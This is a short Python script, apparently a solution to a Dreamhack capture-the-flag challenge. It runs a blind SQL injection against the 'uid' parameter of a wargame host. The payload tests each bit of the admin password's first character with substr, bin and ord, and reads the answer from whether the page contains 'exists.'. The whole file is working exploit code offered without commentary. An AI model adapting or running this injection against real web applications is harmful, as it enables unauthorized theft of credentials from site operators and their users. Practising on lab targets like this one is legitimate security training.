import requests
from urllib import parse


url="http://host3.dreamhack.games:16788/"
for i in range(1,17):
    uid="admin' and substr(bin(ord(substr(upw,1,1))),"+str(i)+",1)='1'#"
    print(uid)
    res=requests.get(f"{url}?&uid={parse.quote(uid)}")
    if res.text.find("exists.")!= -1:
        print(i)

print(res.status_code,res.text)